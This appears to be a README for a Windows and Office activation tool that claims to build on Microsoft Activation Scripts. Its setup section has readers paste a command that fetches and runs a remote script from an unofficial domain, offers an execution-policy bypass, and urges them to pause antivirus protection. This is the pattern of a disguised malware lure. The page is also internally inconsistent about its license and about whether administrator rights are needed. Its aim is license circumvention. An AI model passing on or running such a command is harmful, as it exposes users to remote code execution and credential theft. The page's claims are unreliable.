<div align="center">

# Windows-Activation-Suite: Open-Source HWID, Ohook, TSforge & Online KMS Activator Windows 10 & 11

![preview](https://raw.githubusercontent.com/Muwanga6/win-office-activation-toolkit/main/screen_b0ce58.svg)

[![ci](https://img.shields.io/badge/Ci-Success-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![license](https://img.shields.io/badge/License-Mpl--2.0-2f81f7?style=for-the-badge&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-4.7%2F5-f59e0b?style=for-the-badge&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/Ps-7%2B-54aeff?style=for-the-badge&labelColor=0d1117)]() [![runs-on](https://img.shields.io/badge/Runs--On-Win_10%2F11-0969da?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is a desktop utility that provides HWID, Ohook, TSforge, and Online KMS activation methods for Windows and Office installations across a broad range of versions. The application supports Windows 7, 8, 10, 11, and Server editions alongside Office 2010 through 2021 and 365, detecting the installed edition automatically and presenting the applicable activation paths. It exposes both permanent and KMS-based activation modes, reports current activation state, and offers backup and restore functions for preserving activation status. All functionality is implemented through native Windows activation APIs, avoiding DLL injection and leaving core system files unmodified.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If blocked by policy — CMD fallback
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **HWID Activation** – Generates a permanent digital license tied to the device hardware for Windows 10 and Windows 11, surviving reinstallations on the same machine.

- **Ohook Activation** – Provides permanent, offline Office activation by hooking the licensing verification layer without modifying core application files.

- **TSforge Activation** – Delivers offline activation for legacy Windows releases, including Windows 7, 8, and 8.1, using native activation interfaces.

- **Online KMS Activation** – Offers KMS-based activation for Windows and Office editions where hardware-bound or hook-based methods are not applicable, with configurable renewal handling.

- **Broad Windows Coverage** – Supports Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, LTSC, and IoT editions, plus Windows Server 2016, 2019, and 2022.

- **Broad Office Coverage** – Supports Office 2010, 2013, 2016, 2019, 2021, and 365 across all editions.

- **Automatic Edition Detection** – Identifies the installed Windows or Office edition and selects a compatible activation method without manual configuration.

- **Activation Status Reporting** – Displays the current licensing state, including activation type, remaining KMS period, and license validity.

- **Method Selection** – Lets users choose between permanent activation methods (HWID, Ohook) and renewable KMS activation depending on product and edition.

- **Extended Security Updates** – Enables ESU provisioning for Windows 7 and Windows 10 installations.

- **Activation Backup and Restore** – Captures the current activation state to a local store and restores it after system changes or reinstallation.

- **Non-Destructive Operation** – Relies on native Windows activation APIs and does not modify core system files or inject DLLs into system processes.

- **Reversible Changes** – Provides an uninstall path that removes applied activation artifacts and returns the system to its prior licensing state.

- **Fully Open Source** – Complete source code is available for inspection, audit, and community contribution.

- **Update Resilient** – Maintained to remain compatible with cumulative and feature updates; major updates may require reapplication of activation.

## How It Works

Windows-Activation-Suite operates as a modular activation framework that interfaces directly with the native Windows Software Protection Platform (SPP) and Office licensing services. Each activation method is implemented as an independent module, and the suite selects the appropriate module based on the detected Windows edition, build number, and installed Office product.

**HWID Activation**
For Windows 10 and 11, the suite generates a hardware-bound digital license by constructing a valid product key ticket and submitting it through the SPP infrastructure. The resulting license is tied to the device's hardware fingerprint and is stored persistently, surviving reboots and most cumulative updates without re-execution.

**Ohook Activation**
Office products are activated by installing a licensing hook that intercepts Office's license verification calls at the API level. The hook presents valid license data to the Office application without modifying the Office binaries themselves, yielding a permanent activation state for Office 2010 through 2021 and 365.

**TSforge Activation**
For legacy Windows versions where modern licensing paths are unavailable, TSforge provisions tokens and certificates into the local activation store, emulating a legitimate activation response. This method is fully offline and does not require network communication with Microsoft servers.

**Online KMS Activation**
The suite can also route activation through a Key Management Service. It configures the system's KMS host, applies a generic volume license key, and requests activation over the network. This method applies to both Windows and Office volume editions and requires periodic renewal.

**Detection and Orchestration**
Before execution, the suite enumerates the installed operating system and Office products, reads the current activation status, and maps each detected product to the supported methods. The user is presented with a menu of applicable options, and the selected module handles all registry, token, and service operations required for activation.

**Safety and Reversibility**
All operations are performed through documented Windows activation APIs and user-level configuration changes. The suite does not patch or overwrite core system binaries, and every activation method includes a corresponding cleanup routine that removes provisioned tokens, hooks, and registry entries, restoring the system to its pre-activation state.

## Compatibility

Windows-Activation-Suite is designed to operate across a broad range of Windows and Office releases, using each platform's native activation interfaces. The compatibility matrix below reflects the supported operating systems, editions, and activation methods validated against the current release.

### Windows Operating Systems

- **Windows 7** — Home, Professional, Ultimate, and Enterprise editions are supported via TSforge and Online KMS activation.
- **Windows 8 and 8.1** — Core, Pro, and Enterprise editions are supported via TSforge and Online KMS activation.
- **Windows 10** — Home, Pro, Enterprise, Education, and LTSC editions are supported. HWID provides a permanent digital license; Online KMS is available as an alternative.
- **Windows 11** — Home, Pro, Enterprise, Education, and IoT editions are supported. HWID provides a permanent digital license; Online KMS is available as an alternative.
- **Windows Server** — 2016, 2019, and 2022 releases are supported via Online KMS activation.

### Microsoft Office

- **Office 2010, 2013, 2016, 2019, and 2021** — All editions are supported via Ohook and Online KMS activation.
- **Office 365** — Subscription installations are supported via Ohook activation.

### Activation Method Compatibility

| Method | Targets | Persistence |
|---|---|---|
| HWID | Windows 10 / 11 | Permanent digital license |
| Ohook | Office 2010–2021, 365 | Permanent |
| TSforge | Windows 7 / 8 / 8.1 | Offline-capable |
| Online KMS | Windows and Office (listed above) | Periodic renewal required |

### Architectural and Environmental Notes

- Both **x86** and **x64** architectures are supported across all listed operating systems.
- The suite relies on native Windows activation APIs and does not inject DLLs or modify core system files, preserving compatibility with standard system integrity checks.
- Administrator privileges are required; UAC elevation is detected and enforced at runtime.
- Edition detection is automatic — the suite identifies the installed Windows edition and surfaces only the activation methods applicable to it.
- Domain-joined and volume-licensed environments are supported through Online KMS.
- Major Windows feature updates may reset activation state; re-running the suite restores the prior configuration. Minor cumulative updates generally do not affect activation persistence.

### Known Limitations

- Activation of unlicensed software violates Microsoft's Terms of Service; the suite is intended for educational and evaluation purposes only.
- KMS-based activation requires periodic renewal and is not equivalent to a permanent license.
- Environments with restrictive Group Policy objects governing activation or software restriction policies may require policy adjustment before the suite can operate.

## FAQ

**Q: What is Windows-Activation-Suite?**

A: Windows-Activation-Suite is an open-source desktop activator for Windows and Office. It provides four distinct activation methods — HWID, Ohook, TSforge, and Online KMS — each implemented against native Windows activation APIs rather than through file patching or DLL injection.

**Q: Which activation method should I choose?**

A: Method selection depends on your platform and desired persistence. HWID yields a permanent digital license tied to hardware for Windows 10 and 11. Ohook provides permanent Office activation across supported releases. TSforge targets offline activation on legacy Windows versions, while Online KMS covers Windows Server and scenarios where a KMS-based approach is preferred. The suite detects the installed edition automatically and surfaces the applicable methods.

**Q: Is the activation permanent?**

A: HWID and Ohook produce permanent activation that persists across reboots and normal updates. Online KMS activation is time-limited by design and requires periodic renewal; the tool handles renewal on subsequent runs. TSforge persistence depends on the target platform and edition.

**Q: Does it work offline?**

A: Yes. After the initial script execution, the activation state is local. HWID and Ohook activations do not require an ongoing network connection, and TSforge is built specifically for offline environments. Online KMS requires periodic connectivity to renew its lease.

**Q: Will Windows updates break activation?**

A: Minor cumulative updates do not affect HWID or Ohook activation. Major feature upgrades may invalidate the digital license binding or reset Office activation state; re-running the suite restores activation in those cases. The tool is maintained against known update regressions.

**Q: Does it modify system files?**

A: No. The suite relies on native Windows activation APIs and does not modify core system files, inject DLLs, or alter boot components. Activation is reversible, and a restore option is provided to return the system to its prior state.

**Q: How do I revert activation?**

A: Use the restore and uninstall options exposed in the tool's menu. These remove the applied activation state and back out any configuration changes, returning the system to its pre-activation condition.

**Q: Which Windows and Office versions are supported?**

A: Windows 7, 8, 8.1, 10, 11, and Windows Server 2016/2019/2022 are supported, along with Office 2010 through 2021 and Office 365. Edition coverage includes Home, Pro, Enterprise, Education, LTSC, and IoT variants where applicable.

**Q: Does it support Extended Security Updates?**

A: Yes. The suite includes ESU handling for Windows 7 and Windows 10, allowing extended security updates to remain functional alongside activation.

**Q: What are the prerequisites?**

A: An elevated PowerShell session is required, since activation APIs operate at the system level. Antivirus real-time protection may need to be temporarily suspended if it flags script execution. No installer, archive, or package manager is involved.

**Q: Is this the original Microsoft Activation Scripts project?**

A: No. Windows-Activation-Suite is an independent project built on the open-source Microsoft Activation Scripts codebase. Credit for the underlying activation methods belongs to the original authors; this suite packages and maintains them under its own release cadence.

**Q: Is using this tool safe?**

A: The codebase is open source and auditable, and it avoids system-file modification. However, activating unlicensed software violates Microsoft's Terms of Service. Use only on installations you own, and treat the tool as educational in nature.

## Disclaimer

Windows-Activation-Suite is provided strictly as a technical and educational resource for studying Windows and Office activation mechanisms. The software is distributed on an "as is" basis, without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.

By using this software, you acknowledge and agree that:

- Activating unlicensed copies of Windows or Microsoft Office may violate Microsoft's Terms of Service and applicable local, national, or international laws. You are solely responsible for ensuring that your use of this software complies with all relevant legal and contractual obligations.
- The maintainers of Windows-Activation-Suite do not condone, encourage, or facilitate software piracy. The activation methods implemented in this project are intended for legitimate testing, research, and educational scenarios on installations you own or are authorized to modify.
- You assume full responsibility for any consequences arising from the use, misuse, or inability to use this software, including but not limited to system instability, activation failures, data loss, or legal liability.
- The developers and contributors of Windows-Activation-Suite shall not be held liable for any direct, indirect, incidental, special, consequential, or punitive damages resulting from the use of or inability to use this software, even if advised of the possibility of such damages.
- This project is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. All trademarks, product names, and company names referenced remain the property of their respective owners.
- Because the software is open source, you are encouraged to review the source code prior to execution to understand exactly what operations are performed on your system. Third-party distributions that alter the source or execution commands are not the responsibility of the maintainers.
- The maintainers reserve the right to modify, update, or discontinue the project at any time without notice, and make no commitment to provide support, maintenance, or updates.

Use of Windows-Activation-Suite constitutes acceptance of these terms. If you do not agree, do not use the software.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants broad freedom to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software. The license requires that the original copyright notice and permission notice be retained in all copies or substantial portions of the software, and it is provided strictly on an "as is" basis, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

The complete license text is contained in the LICENSE file at the root of the repository and governs all use of the project's source code and distributed components.

This project builds upon the open-source Microsoft Activation Scripts work originally authored by massgravel. All credit for the foundational activation methods—HWID, Ohook, TSforge, and Online KMS—belongs to the original developers, and their licensing terms are preserved and respected within this distribution. Windows-Activation-Suite maintains the same permissive licensing model to keep the codebase transparent, auditable, and freely extensible for the community.

The MIT License applies solely to the source code of this project. It does not grant any rights to Microsoft Windows, Microsoft Office, or any other proprietary Microsoft product, nor does it alter or supersede any license agreement you may hold with Microsoft. Activation of unlicensed software may violate Microsoft's Terms of Service; the license under which this project is distributed confers no authority over third-party software and places full responsibility for compliance on the end user.

Contributions submitted to the project are accepted under the same MIT License, ensuring that all improvements, patches, and derivative works remain available to the community under consistent terms.